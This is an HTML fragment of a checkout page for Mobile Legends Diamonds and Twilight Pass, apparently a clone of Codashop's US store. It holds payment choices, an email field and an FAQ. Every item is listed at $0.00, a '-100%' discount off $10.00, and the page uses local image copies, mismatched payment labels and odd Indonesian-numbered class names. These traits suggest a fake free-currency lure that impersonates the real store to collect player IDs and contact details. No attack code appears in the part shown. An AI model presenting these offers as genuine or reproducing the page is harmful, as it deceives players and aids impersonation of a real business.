                                                                  <!----><!---->
                                                               </div>
                                                               <!---->
                                                               <div class="sku-info-section__images" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__images__icon" data-v-b6e2aaf7=""><img data-nuxt-img="" srcset="images/1760334861806_b6849054-08c2-44af-8750-2f7ea6ce9814.png 1x, images/1760334861806_b6849054-08c2-44af-8750-2f7ea6ce9814.png 2x" onerror="this.setAttribute('data-error', 1)" alt="Twilight Pass" loading="lazy" src="images/1760334861806_b6849054-08c2-44af-8750-2f7ea6ce9814.png" data-v-b6e2aaf7=""></div>
                                                               </div>
                                                            </div>
                                                            <div class="price-section" data-testid="sku-item-starting-price-growthplan_5_codashop_USD_10" data-v-b6e2aaf7="">
                                                               <!--[--><!---->
                                                               <div class="price-section__price" data-v-1a52783c="">
                                                                  <span class="price-section__price__prefix" data-v-1a52783c="">From</span>
                                                                  <div class="price-section__price__price-container" data-v-1a52783c="">
                                                                     <span class="price-section__price__price-container__amount" data-v-1a52783c="">$0.0</span><!---->
                                                                  </div>
                                                               </div>
                                                               <!----><!----><!--]-->
                                                            
                <div data-v-1a52783c="" class="price-section__usual-price">
                    <span data-v-1a52783c="" class="price-section__price__price-container__discount-tag"> -100% </span>
                    <span data-v-1a52783c="" class="price-section__usual-price__amount">$10.00</span>
                </div>
            </div>
                                                            <!---->
                                                         </div>
                                                         <!--[--><!----><!--]-->
                                                      </div>
                                                   </div>
                                                   <!--]-->
                                                </div>
                                             </section>
                                             <!--]-->
                                          </div>
                                          <!--]--><!----><!---->
                                       </div>
                                       <!--]--><!--]-->
                                    </div>
                                 </div>
                                 <div id="step-payment-method" class="product__purchase-step__container" data-testid="purchase-step-payment-channels" data-v-a85cd964="" data-v-0a726f0f="">
                                    <!---->
                                    <div class="product__purchase-step__heading" data-v-0a726f0f="">
                                       <h2 id="step-payment-method-heading" data-v-0a726f0f="">
                                          <span class="product__purchase-step__icon" data-v-0a726f0f=""></span><span class="product__purchase-step__title" data-v-0a726f0f="">Select Payment</span><!---->
                                       </h2>
                                    </div>
                                    <div class="product__purchase-step__pre-content" data-v-0a726f0f="">
                                       <!--[--><!----><!--]-->
                                    </div>
                                    <div class="product__purchase-step__content" data-v-0a726f0f="">
                                       <!--[--><!----><input hidden="" type="hidden" readonly="" name="paymentChannelId" value="-1" style="position: fixed; height: 0px; padding: 0px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); white-space: nowrap; border-width: 0px; display: none;">
                                       <div data-v-d3d850d8="" class="payment-section" data-testid="payment-section" id="headlessui-radiogroup-v-0-2-28" role="radiogroup">
                                          <div data-v-238b72ee="" data-v-d3d850d8="" class="payment-method" data-testid="payment-section-item-1011" id="headlessui-radiogroup-option-v-0-1-87" role="radio" aria-checked="false" tabindex="0" data-headlessui-state="">
                                             <section data-v-238b72ee="" id="paymentChannel_1011" class="payment-method__content--default">
                                                <figure data-v-238b72ee="" class="payment-method__logo">
                                                   <img data-v-238b72ee="" data-nuxt-img="" srcset="images/codacash-darkmatter.png 1x, images/codacash-darkmatter.png 2x" class="payment-method__logo-img" alt="Coda Cash" loading="lazy" src="images/codacash-darkmatter.png">
                                                   <div data-v-238b72ee="" class="payment-method__logo-tagline">Codacash</div>
                                                </figure>
                                                <!----><!---->
                                             </section>
                                             <section style="margin-left:15px;margin-bottom:5px" data-v-238b72ee="" class="payment-method__pricing"><div data-v-238b72ee="" class="payment-method__pricing__info"><!----><!----></div><div data-v-238b72ee="" class="payment-method__price"><span data-v-238b72ee="">$0.00</span><!----></div></section>
                                             <!---->
                                          </div>
                                       <div data-v-238b72ee="" data-v-d3d850d8="" class="payment-method" data-testid="payment-section-item-1006" id="headlessui-radiogroup-option-v-0-2-29" role="radio" aria-checked="false" tabindex="0" data-headlessui-state="">
                                             <section data-v-238b72ee="" id="paymentChannel_1006" class="payment-method__content--simplified">
                                                <figure data-v-238b72ee="" class="payment-method__logo">
                                                   <img data-v-238b72ee="" data-nuxt-img="" srcset="images/CARDPAYMENTS_US_CHNL_LOGO.webp 1x, images/CARDPAYMENTS_US_CHNL_LOGO.webp 2x" class="payment-method__logo-img" alt="Card Payments" loading="lazy" src="images/CARDPAYMENTS_US_CHNL_LOGO.webp">
                                                   <div data-v-238b72ee="" class="payment-method__logo-tagline">Card Payments</div>
                                                </figure>
                                                <!----><!---->
                                             </section>

                                             <section style="margin-left:15px;margin-bottom:5px" data-v-238b72ee="" class="payment-method__pricing"><!----><div data-v-238b72ee="" class="payment-method__price"><span data-v-238b72ee="">$0.00</span><!----></div></section>
                                             <!---->
                                          </div>
                                          <div data-v-238b72ee="" data-v-d3d850d8="" class="payment-method" data-testid="payment-section-item-780" id="headlessui-radiogroup-option-v-0-2-30" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="">
                                             <section data-v-238b72ee="" id="paymentChannel_780" class="payment-method__content--simplified">
                                                <figure data-v-238b72ee="" class="payment-method__logo">
                                                   <img data-v-238b72ee="" data-nuxt-img="" srcset="images/PAYPAL_US_CHNL_LOGO.webp 1x, images/PAYPAL_US_CHNL_LOGO.webp 2x" class="payment-method__logo-img" alt="PayPal" loading="lazy" src="images/PAYPAL_US_CHNL_LOGO.webp">
                                                   <div data-v-238b72ee="" class="payment-method__logo-tagline">PayPal</div>
                                                </figure>
                                                <!----><!---->
                                             </section>
                                             <section style="margin-left:15px;margin-bottom:5px" data-v-238b72ee="" class="payment-method__pricing"><!----><div data-v-238b72ee="" class="payment-method__price"><span data-v-238b72ee="">$0.00</span><!----></div></section>
                                             <!---->
                                          </div>
                                          <div data-v-238b72ee="" data-v-d3d850d8="" class="payment-method" data-testid="payment-section-item-899" id="headlessui-radiogroup-option-v-0-2-31" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="">
                                            <section data-v-238b72ee="" id="paymentChannel_899" class="payment-method__content--simplified">
                                                <figure data-v-238b72ee="" class="payment-method__logo">
                                                    <img data-v-238b72ee="" data-nuxt-img="" srcset="images/CASHAPP_US_CHNL_LOGO.webp 1x, images/CASHAPP_US_CHNL_LOGO.webp 2x" class="payment-method__logo-img" alt="Cash App" loading="lazy" src="images/CASHAPP_US_CHNL_LOGO.webp">
                                                    <div data-v-238b72ee="" class="payment-method__logo-tagline">Cash App</div>
                                                </figure>
                                                <!----><!---->
                                            </section>
                                            <section style="margin-left:15px;margin-bottom:5px" data-v-238b72ee="" class="payment-method__pricing"><!----><div data-v-238b72ee="" class="payment-method__price"><span data-v-238b72ee="">$0.00</span><!----></div></section>
                                             <!---->
                                            </div>

                                       </div>
                                       <!--]-->
                                    </div>
                                 </div>

                                 <!---->
                                 <div data-v-0a726f0f="" data-v-a85cd964="" id="step-details" class="product__purchase-step__container" data-testid="purchase-step-buy-now">
                                    <!---->
                                    <div data-v-0a726f0f="" class="product__purchase-step__heading">
                                       <h2 data-v-0a726f0f="" id="step-details-heading">
                                          <span data-v-0a726f0f="" class="product__purchase-step__icon"></span><span data-v-0a726f0f="" class="product__purchase-step__title">Enter Details</span><!---->
                                       </h2>
                                    </div>
                                    <!---->
                                    <div data-v-0a726f0f="" class="product__purchase-step__content unpadded">
                                       <section data-v-83406e2d="" data-v-a85cd964="" class="buy-section__container" data-testid="buy-checkout">
                                          <section data-v-83406e2d="" class="buy-section__container__wrap">
                                             <div data-v-92300625="" data-v-83406e2d="" class="buy-section__checkout-email-form" data-testid="buy-checkout-email-form">
                                                <div data-v-92300625="" class="buy-section__checkout-email-form__description-wrapper">
                                                   <div data-v-92300625="" class="buy-section__checkout-email-form__description">Please enter an email address for your receipt</div>
                                                   <!---->
                                                </div>
                                                <div data-v-c991c0e3="" data-v-92300625="" class="text-field buy-section__checkout-email-form__input" data-theme="lightTheme" data-testid="form-text-field">
                                                   <div data-v-c991c0e3="" class="text-field__input-container text-field__input-container--full-width">
                                                      <input data-v-c991c0e3="" id="email" type="text" placeholder="Please enter the email" name="email" autocomplete="on" class="text-field__input-container__input peer text-field__input-container__input--default"><!----><!----><!----><!---->
                                                   </div>
                                                   <!----><!---->
                                                </div>
                                             </div>
                                             <div data-v-83406e2d="">
                                                <div data-v-11b9ad8f="" class="checkbox mt-[8px]" data-auto-capture="codaMarketingConsentBoxClicked">
                                                   <label data-v-11b9ad8f="" class="checkbox__label checkbox__label--default" data-theme="lightTheme"><input data-v-11b9ad8f="" id="email-consent-checkbox" type="checkbox" name="emailConsent" class="checkbox__label__input peer"><span data-v-11b9ad8f="" class="checkbox__label__text lightTheme:peer-disabled:text-dark-disabled darkTheme:peer-disabled:text-light-disabled"><span>Yes, send me messages with exclusive Codashop news and promotions.</span></span></label><!---->
                                                </div>
                                                <div data-v-11b9ad8f="" class="checkbox checkbox-container marketing-consent__mobile mt-[8px]">
                                                   <label data-v-11b9ad8f="" class="checkbox__label checkbox__label--default" data-theme="lightTheme"><input data-v-11b9ad8f="" id="mobile-consent-checkbox" type="checkbox" name="mobileConsent" class="checkbox__label__input peer"><span data-v-11b9ad8f="" class="checkbox__label__text lightTheme:peer-disabled:text-dark-disabled darkTheme:peer-disabled:text-light-disabled"><span>Yes, I would like to receive news and promotions via SMS.</span></span></label><!---->
                                                </div>
                                                <!---->
                                             </div>
                                             <!---->
                                             <div data-v-7923bbd3="" data-v-83406e2d="" id="step-privacy" class="policy-disclosure-container">
                                                <p data-v-7923bbd3="" class="policy-disclosure-title">Terms & Conditions:</p>
                                                <div data-v-7923bbd3="" class="policy-disclosure-text-container">
                                                   <div data-v-7923bbd3="" class="policy-disclosure-text policy-disclosure-text-container"><strong>By clicking "Buy Now", I acknowledge that the purchase of this virtual item will be a license for its use, subject to the publisher providing this service and to their end user license agreement that I accepted.</strong><br><br>Furthermore: <br>(i) I acknowledge that I have read, understand and agree to Codashop's <a href="https://www.coda.co/terms-conditions/terms-conditions-us" target="_blank" rel="noopener">Terms & Conditions</a> and <a href="https://www.coda.co/privacy-policy/privacy-policy-us/" target="_blank" rel="noopener">Privacy Policy</a>, and <br>(ii) I understand and agree that all sales are final and non-refundable</div>
                                                </div>
                                             </div>
                                             <!---->
                                          </section>
                                       </section>
                                    </div>
                                 </div>
                              </div>
                              <div data-testid="promo-screen" style="display:none;" data-v-a85cd964="">
                                 <!---->
                              </div>
                              <div data-v-82590ec1="" data-v-a85cd964="" class="checkout-guide">
                                <div data-v-82590ec1="" class="checkout-guide-button guidenol" style="">
                                    <div data-v-82590ec1="">
                                       <!---->
                                       <i class="fa fa-solid fa-user"></i>
                                       <!----><!----><!---->
                                    </div>
                                    <div data-v-82590ec1="" class="checkout-guide-label">
                                       <div data-v-82590ec1="">Enter User ID</div>
                                    </div>
                                    <div data-v-e14c7668="" data-v-82590ec1="" class="inline-block">
                                       <svg data-v-e14c7668="" width="20" height="20" viewBox="0 0 20 20">
                                          <circle data-v-e14c7668="" cx="10" cy="10" r="9" stroke="#3F3C4D" stroke-width="2" fill="none"></circle>
                                          <circle data-v-e14c7668="" cx="10" cy="10" r="9" stroke="#41BE68" stroke-width="2" fill="none" stroke-dasharray="56.548667764616276" stroke-dashoffset="56.548667764616276" stroke-linecap="round" style="transition: stroke-dashoffset 1s;"></circle>
                                       </svg>
                                    </div>
                                 </div>
                                 <div data-v-82590ec1="" class="checkout-guide-button guidesatu" style="display:none">
                                    <div data-v-82590ec1="">
                                       <!---->
                                       <svg data-v-82590ec1="" width="21" height="20" viewBox="0 0 21 20" fill="none" xmlns="http://www.w3.org/2000/svg" id="checkout-guide-icon-cart" class="checkout-guide-icon">
                                          <path d="M9.66658 7.49992H11.3333V4.99992H13.8333V3.33325H11.3333V0.833252H9.66658V3.33325H7.16658V4.99992H9.66658V7.49992ZM6.33325 14.9999C5.41658 14.9999 4.67492 15.7499 4.67492 16.6666C4.67492 17.5833 5.41658 18.3333 6.33325 18.3333C7.24992 18.3333 7.99992 17.5833 7.99992 16.6666C7.99992 15.7499 7.24992 14.9999 6.33325 14.9999ZM14.6666 14.9999C13.7499 14.9999 13.0083 15.7499 13.0083 16.6666C13.0083 17.5833 13.7499 18.3333 14.6666 18.3333C15.5833 18.3333 16.3333 17.5833 16.3333 16.6666C16.3333 15.7499 15.5833 14.9999 14.6666 14.9999ZM7.24992 10.8333H13.4583C14.0833 10.8333 14.6333 10.4916 14.9166 9.97492L18.1333 4.13325L16.6833 3.33325L13.4583 9.16658H7.60825L4.05825 1.66659H1.33325V3.33325H2.99992L5.99992 9.65825L4.87492 11.6916C4.26659 12.8083 5.06659 14.1666 6.33325 14.1666H16.3333V12.4999H6.33325L7.24992 10.8333Z" fill="white"></path>
                                       </svg>
                                       <!----><!----><!---->
                                    </div>
                                    <div data-v-82590ec1="" class="checkout-guide-label">
                                       <div data-v-82590ec1="">Select Top Up</div>
                                    </div>
                                    <div data-v-e14c7668="" data-v-82590ec1="" class="inline-block">
                                       <svg data-v-e14c7668="" width="20" height="20" viewBox="0 0 20 20">
                                          <circle data-v-e14c7668="" cx="10" cy="10" r="9" stroke="#3F3C4D" stroke-width="2" fill="none"></circle>
                                          <circle data-v-e14c7668="" cx="10" cy="10" r="9" stroke="#41BE68" stroke-width="2" fill="none" stroke-dasharray="56.548667764616276" stroke-dashoffset="40.548667764616276" stroke-linecap="round" style="transition: stroke-dashoffset 1s;"></circle>
                                       </svg>
                                    </div>
                                 </div>
                                 <div data-v-82590ec1="" class="checkout-guide-button guidedua" style="display:none">
                                    <div data-v-82590ec1="">
                                       <!---->
                                       <svg data-v-82590ec1="" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" id="checkout-guide-icon-wallet" class="checkout-guide-icon"><path d="M3 4a1 1 0 0 0-1 1v14a1 1 0 0 0 1 1h18a1 1 0 0 0 1-1V8.5a1 1 0 0 0-1-1h-.8V5a1 1 0 0 0-1-1H3Zm17 7h-4a1 1 0 0 0-.832.445l-1 1.5a1 1 0 0 0 0 1.11l1 1.5A1 1 0 0 0 16 16h4v2H4V6h14.2v1.5H7.7a1 1 0 0 0 0 2H20V11Zm0 3h-3.465l-.333-.5.333-.5H20v1Z"></path></svg>
                                       <!----><!----><!---->
                                    </div>
                                    <div data-v-82590ec1="" class="checkout-guide-label">
                                       <div data-v-82590ec1="">Select Payment</div>
                                    </div>
                                    <div data-v-e14c7668="" data-v-82590ec1="" class="inline-block">
                                       <svg data-v-e14c7668="" width="20" height="20" viewBox="0 0 20 20">
                                          <circle data-v-e14c7668="" cx="10" cy="10" r="9" stroke="#3F3C4D" stroke-width="2" fill="none"></circle>
                                          <circle data-v-e14c7668="" cx="10" cy="10" r="9" stroke="#41BE68" stroke-width="2" fill="none" stroke-dasharray="56.548667764616276" stroke-dashoffset="30.548667764616276" stroke-linecap="round" style="transition: stroke-dashoffset 1s;"></circle>
                                       </svg>
                                    </div>
                                 </div>
                                 <div data-v-82590ec1="" class="checkout-guide-buy-widget-container guidetiga" style="display:none">
                                    <div data-v-f911dd2a="" data-v-82590ec1="" data-testid="buy-widget" class="buy-widget buy-widget--active" data-auto-capture="buyNowClick" style="">
                                    <div data-v-f911dd2a="" class="buy-widget__info">
                                        <section data-v-ba6c0192="" data-v-f911dd2a="" class="buy-widget-status-section visible" data-testid="buy-widget-status"><span data-v-ba6c0192="">5 Diamonds</span><span data-v-ba6c0192="" class="buy-widget-status-subtitle"></span><span data-v-ba6c0192="" class="round-divider"></span><span data-v-ba6c0192="">ShopeePay</span></section>
                                        <section data-v-f911dd2a="" class="buy-widget__info__content">
                                            <section data-v-3c70e4e2="" data-v-f911dd2a="" class="buy-widget-price-container visible">
                                                <!---->
                                                <section data-v-3c70e4e2="" class="buy-widget-strikethrough-section"><span data-v-3c70e4e2="" class="buy-widget-strikethrough-price" data-testid="buy-widget-strikethrough-price">$10.00</span><span data-v-3c70e4e2="" class="buy-widget-total-saved" data-testid="buy-widget-total-saved">Save $10.00</span></section>
                                                <div data-v-3c70e4e2="" class="buy-widget-price buy-widget-price--highlighted" data-testid="buy-widget-price-amount"><span data-v-3c70e4e2="">$0.00</span></div>
                                                <span data-v-3c70e4e2="" class="buy-widget-tax-info">Tax will be charged at checkout</span>
                                            </section>
                                            <div data-v-f911dd2a="" class="buy-widget__info__content__button" data-testid="buy-widget-submit-button">
                                                <button data-v-cac760de="" data-v-f911dd2a="" data-variant="success" data-size="medium" data-loading="false" class="button-solid button-solid--with-content button-solid--full-width" id="mdn-submit">
                                                <div data-v-f911dd2a="" data-testid="buy-widget-animation"><span data-v-f911dd2a="" class="buy-widget__info__content__button__shimmer"></span><span data-v-f911dd2a="" class="buy-widget__info__content__button__glow"></span></div>
                                                <span data-v-cac760de="" class="button-solid__inner">
                                                    <span data-v-cac760de="" class="button-solid__inner__content button-solid__inner__content--icon-prefix">
                                                        <!----><span data-v-cac760de="" class="button-solid__inner__content__slot">Buy Now</span>
                                                    </span>
                                                    <svg data-v-a7a8fb45="" data-v-cac760de="" class="loading-spinner button-solid__inner__spinner" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                                        <g data-v-a7a8fb45="">
                                                            <circle data-v-a7a8fb45="" cx="12" cy="12" r="9.5" fill="none" stroke="inherit" stroke-width="3" stroke-linecap="round"></circle>
                                                        </g>
                                                    </svg>
                                                </span>
                                                </button>
                                            </div>
                                        </section>

                                        <!----><!---->
                                    </div>
                                    </div>

                                    </div>
                              </div>
                           </div>
                        </div>
                        <div class="product__faq_section" data-v-a85cd964="">
                           <div class="product-long-description" data-v-a85cd964="" data-v-c063fa34="">
                              <h1 class="product-long-description__title" data-v-c063fa34="">Find the best Mobile Legends top up deals and get up to 2x bonus Diamonds only at Codashop United States</h1>
                              <div class="product-long-description__content" data-testid="product-long-description" data-v-c063fa34="">
                                 <p class="shop-content--paragraph">Codashop is the safe and easy way to buy official game and app credits. We are trusted by millions of gamers and app users in over 50 countries including the United States. <a href="#top">Top up now.</a></p>
                                 <p class="shop-content--paragraph">Codashop United States offers Mobile Legends Diamond and Twilight Pass which unlocks access to premium content in the game, bringing your gameplay to the next level!
                                 </p>
                                 <p class="shop-content--paragraph"><strong>Why Choose Codashop for Mobile Legends top up?</strong></p>
                                 <p class="shop-content--paragraph">
                                    Quick and Easy<br>
                                    It only takes a few seconds to top up MLBB Diamond and Twilight Pass on Codashop.<br><br>
                                    Instant & Secure Delivery<br>
                                    Purchases are delivered straight to your in-game account<br><br>
                                    Convenient payment methods<br>
                                    Pay using the most popular payment methods in the United States.<br><br>
                                    Speedy & Localized Customer Support<br>
                                    Our support team is always ready to help. Send us a message through <a href="https://us.support.codashop.com/hc/en-us">this form</a> and we will get back to you ASAP!<br><br>
                                    Exciting promotions<br>
                                    Never miss out on awesome deals, giveaways, and more only at Codashop!
                                 </p>
                                 <a id="bottom"></a>
                              </div>
                           </div>
                           <div class="product-faq-section" data-v-a85cd964="" data-v-b133f038="">
                              <!--[-->
                              <section class="product-faq-item__container" data-v-b133f038="" data-v-2062635a="">
                                 <div class="product-faq-item__content" data-v-2062635a="">
                                    <h3 class="product-faq-item__content-header" data-v-2062635a="">How to top up ML Diamonds?</h3>
                                    <span class="product-faq-item__content-header-icon" data-v-2062635a="">
                                       <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" data-v-2062635a="">
                                          <path d="M5.293 8.293a1 1 0 0 1 1.414 0L12 13.586l5.293-5.293a1 1 0 1 1 1.414 1.414l-6 6a1 1 0 0 1-1.414 0l-6-6a1 1 0 0 1 0-1.414Z"></path>
                                       </svg>
                                    </span>
                                 </div>
                                 <div class="hidden product-faq-item__content-description" data-testid="product-faq-item-description" data-v-2062635a="">
                                    <ol>
                                       <li><a href="#top">Click here to get started</a></li>
                                       <li>Enter your MLBB user ID and Zone ID.</li>
                                       <li>Select the value of Diamonds you wish to purchase.</li>
                                       <li>Choose your preferred payment method</li>
                                       <li>Complete the transaction and the diamonds will be instantly delivered to your Mobile Legends account.</li>
                                    </ol>
                                    You can also top up Mobile Legends Diamonds to your family and friends by typing in their User ID and Zone ID.
                                 </div>
                              </section>
                              <section class="product-faq-item__container" data-v-b133f038="" data-v-2062635a="">
                                 <div class="product-faq-item__content" data-v-2062635a="">
                                    <h3 class="product-faq-item__content-header" data-v-2062635a="">How does Double Diamonds bonus work?</h3>
                                    <span class="product-faq-item__content-header-icon" data-v-2062635a="">
                                       <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" data-v-2062635a="">
                                          <path d="M5.293 8.293a1 1 0 0 1 1.414 0L12 13.586l5.293-5.293a1 1 0 1 1 1.414 1.414l-6 6a1 1 0 0 1-1.414 0l-6-6a1 1 0 0 1 0-1.414Z"></path>
                                       </svg>
                                    </span>
                                 </div>
                                 <div class="hidden product-faq-item__content-description" data-testid="product-faq-item-description" data-v-2062635a="">
                                    <p class="shop-content--paragraph">The Double Diamonds Bonus in Mobile Legends is a one-time reward for first-time top-ups, giving players extra Diamonds when purchasing in-game currency. Here’s how it works:</p>
                                    <p class="shop-content--paragraph">First-Time Purchase Bonus:<br>
                                       Purchase the 50-Diamond tier: 50 base Diamonds + 50 bonus Diamonds = 100 total Diamonds<br>
                                       Purchase the 150-Diamond tier: 150 base Diamonds + 150 bonus Diamonds = 300 total Diamonds<br>
                                       Purchase the 250-Diamond tier: 250 base Diamonds + 250 bonus Diamonds = 500 total Diamonds<br>
                                       Purchase the 500-Diamond tier: 500 base Diamonds + 500 bonus Diamonds = 1000 total Diamonds
                                    </p>
                                    <p class="shop-content--paragraph">For each tier, the double Diamonds bonus only applies to your first purchase, regardless of channel or payment platform.</p>
                                    <p class="shop-content--paragraph">Note: This applies only once per Diamond tier—subsequent purchases of the same bundle will not get the bonus.</p>
                                 </div>
                              </section>
                              <section class="product-faq-item__container" data-v-b133f038="" data-v-2062635a="">
                                 <div class="product-faq-item__content" data-v-2062635a="">
                                    <h3 class="product-faq-item__content-header" data-v-2062635a="">How to buy Twilight Pass?</h3>
                                    <span class="product-faq-item__content-header-icon" data-v-2062635a="">
                                       <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" data-v-2062635a="">
                                          <path d="M5.293 8.293a1 1 0 0 1 1.414 0L12 13.586l5.293-5.293a1 1 0 1 1 1.414 1.414l-6 6a1 1 0 0 1-1.414 0l-6-6a1 1 0 0 1 0-1.414Z"></path>
                                       </svg>
                                    </span>
                                 </div>
                                 <div class="hidden product-faq-item__content-description" data-testid="product-faq-item-description" data-v-2062635a="">
                                    <ol>
                                       <li><a href="#top">Click here to get started</a></li>
                                       <li>Enter your MLBB user ID and Zone ID.</li>
                                       <li>Choose Twilight Pass</li>
                                       <li>Select your preferred payment method</li>
                                       <li>Complete the transaction and your Twilight Pass will be instantly delivered to your Mobile Legends account</li>
                                    </ol>
                                    You can also buy Twilight Pass to your family and friends by typing in their User ID and Zone ID.
                                 </div>
                              </section>
                              <section class="product-faq-item__container" data-v-b133f038="" data-v-2062635a="">
                                 <div class="product-faq-item__content" data-v-2062635a="">
                                    <h3 class="product-faq-item__content-header" data-v-2062635a="">How to buy StarLight Membership?</h3>
                                    <span class="product-faq-item__content-header-icon" data-v-2062635a="">
                                       <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" data-v-2062635a="">
                                          <path d="M5.293 8.293a1 1 0 0 1 1.414 0L12 13.586l5.293-5.293a1 1 0 1 1 1.414 1.414l-6 6a1 1 0 0 1-1.414 0l-6-6a1 1 0 0 1 0-1.414Z"></path>
                                       </svg>
                                    </span>
                                 </div>
                                 <div class="hidden product-faq-item__content-description" data-testid="product-faq-item-description" data-v-2062635a="">
                                    <ol>
                                       <li><a href="#top">Click here to get started</a></li>
                                       <li>Enter your MLBB user ID and Zone ID.</li>
                                       <li>Top up at least 300 Diamonds to purchase StarLight Member, or 750 Diamonds for StarLight Member Plus.</li>
                                       <li>Complete the transaction and your purchase will instantly reflect on your Mobile Legends account.</li>
                                       <li>Log in to your mobile legends account</li>
                                       <li>Click StarLight at the left part of the home page</li>
                                       <li>Click purchase membership</li>
                                       <li>Select StarLight or StarLight Plus membership</li>
                                       <li>Follow the on-screen instructions to complete your purchase</li>
                                    </ol>
                                    Once your purchase is successful, you'll immediately gain access to the benefits included in the StarLight Membership, such as exclusive skins, heroes, discounts, and other perks
                                 </div>
                              </section>
                              <section class="product-faq-item__container" data-v-b133f038="" data-v-2062635a="">
                                 <div class="product-faq-item__content" data-v-2062635a="">
                                    <h3 class="product-faq-item__content-header" data-v-2062635a="">How much to recharge in ML?</h3>
                                    <span class="product-faq-item__content-header-icon" data-v-2062635a="">
                                       <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" data-v-2062635a="">
                                          <path d="M5.293 8.293a1 1 0 0 1 1.414 0L12 13.586l5.293-5.293a1 1 0 1 1 1.414 1.414l-6 6a1 1 0 0 1-1.414 0l-6-6a1 1 0 0 1 0-1.414Z"></path>
                                       </svg>
                                    </span>
                                 </div>
                                 <div class="hidden product-faq-item__content-description" data-testid="product-faq-item-description" data-v-2062635a="">
                                    <p class="shop-content--paragraph">1,160 to 6,000 ML Diamonds range from $19.99 to $99.99.</p>
                                    <p class="shop-content--paragraph">
                                       Twilight Pass: $10.00<br>
                                       StarLight membership: 300 Diamonds<br>
                                       StarLight membership plus: 700 Diamonds
                                    </p>
                                    <p class="shop-content--paragraph">
                                       Note: All prices are subject to change without notice. For accurate information, please visit our Mobile Legends page, <a href="#top">click here</a>
                                    </p>
                                 </div>
                              </section>
                              <section class="product-faq-item__container" data-v-b133f038="" data-v-2062635a="">
                                 <div class="product-faq-item__content" data-v-2062635a="">
                                    <h3 class="product-faq-item__content-header" data-v-2062635a="">Weekly Diamond Pass Membership Benefits</h3>
                                    <span class="product-faq-item__content-header-icon" data-v-2062635a="">
                                       <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" data-v-2062635a="">
                                          <path d="M5.293 8.293a1 1 0 0 1 1.414 0L12 13.586l5.293-5.293a1 1 0 1 1 1.414 1.414l-6 6a1 1 0 0 1-1.414 0l-6-6a1 1 0 0 1 0-1.414Z"></path>
                                       </svg>
                                    </span>
                                 </div>
                                 <div class="hidden product-faq-item__content-description" data-testid="product-faq-item-description" data-v-2062635a="">
                                    <p class="shop-content--paragraph">
                                       The Mobile Legends Weekly Diamond Pass (WDP) offers players a cost-effective way to acquire in-game currency.
                                       <br><br>
                                       Immediate Rewards: Upon purchase, you instantly receive 80 Diamonds.
                                       <br><br>
                                       Daily Rewards: For the next seven days, logging in daily grants you 20 Diamonds per day, totaling an additional 140 Diamonds.
                                       <br><br>
                                       Total Diamonds: By the end of the week, you accumulate a total of 220 Diamonds
                                       <br><br>
                                       Additionally, the pass includes a Late Sign-in card, which permits players to recover missed daily rewards, ensuring you don't lose out due to a missed login. 
                                       <br><br>
                                       <strong>Note:</strong> The Weekly Diamond Pass does not count towards Recharge Benefits in MLBB. Therefore, if you're aiming to achieve certain recharge milestones or rewards, you'll need to make separate top-up purchases
                                    </p>
                                 </div>
                              </section>
                              <section class="product-faq-item__container" data-v-b133f038="" data-v-2062635a="">
                                 <div class="product-faq-item__content" data-v-2062635a="">
                                    <h3 class="product-faq-item__content-header" data-v-2062635a="">StarLight Membership Benefits</h3>
                                    <span class="product-faq-item__content-header-icon" data-v-2062635a="">
                                       <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" data-v-2062635a="">
                                          <path d="M5.293 8.293a1 1 0 0 1 1.414 0L12 13.586l5.293-5.293a1 1 0 1 1 1.414 1.414l-6 6a1 1 0 0 1-1.414 0l-6-6a1 1 0 0 1 0-1.414Z"></path>
                                       </svg>
                                    </span>
                                 </div>
                                 <div class="hidden product-faq-item__content-description" data-testid="product-faq-item-description" data-v-2062635a="">
                                    <p class="shop-content--paragraph">The StarLight Membership is a premium monthly subscription in Mobile Legends that offers exclusive rewards, perks, and bonuses.</p>
                                    Subscribers will receive:
                                    <ul>
                                       <li>Exclusive StarLight Skin every month</li>
                                       <li>Additional 4 StarLight Exclusive Skins to Choose From</li>
                                       <li>Unique Avatar Border & Battle Emote</li>
                                       <li>Bonus Rewards & Weekly Free Heroes</li>
                                       <li>Extra Starlight Privileges (XP bonus, priority in banning phase, and more)</li>
                                    </ul>
                                    Buy Diamonds and get your StarLight Membership today! Top up <a href="#top">here.</a>
                                 </div>
                              </section>
                              <section class="product-faq-item__container" data-v-b133f038="" data-v-2062635a="">
                                 <div class="product-faq-item__content" data-v-2062635a="">
                                    <h3 class="product-faq-item__content-header" data-v-2062635a="">Twilight Pass Benefits</h3>
                                    <span class="product-faq-item__content-header-icon" data-v-2062635a="">
                                       <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" data-v-2062635a="">
                                          <path d="M5.293 8.293a1 1 0 0 1 1.414 0L12 13.586l5.293-5.293a1 1 0 1 1 1.414 1.414l-6 6a1 1 0 0 1-1.414 0l-6-6a1 1 0 0 1 0-1.414Z"></path>
                                       </svg>
                                    </span>
                                 </div>
                                 <div class="hidden product-faq-item__content-description" data-testid="product-faq-item-description" data-v-2062635a="">
                                    <p class="shop-content--paragraph">The Twilight Pass is a premium in-game pass in Mobile Legends that offers exclusive rewards, including Twilight Coins, skins, and other valuable items.</p>
                                    Subscribers will receive:
                                    <ul>
                                       <li>Twilight Coins: Earn exclusive currency to exchange for rare skins and items</li>
                                       <li>Exclusive Skins & Rewards: Unlock special hero skins, recall effects, and more</li>
                                       <li>Bonus Weekly Rewards: Get additional items and bonuses as you progress</li>
                                       <li>Discounts & Perks: Enjoy special discounts on selected in-game items</li>
                                    </ul>
                                 </div>
                              </section>
                              <!--]-->
                           </div>
                        </div>
                        <!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!---->
                     </div>
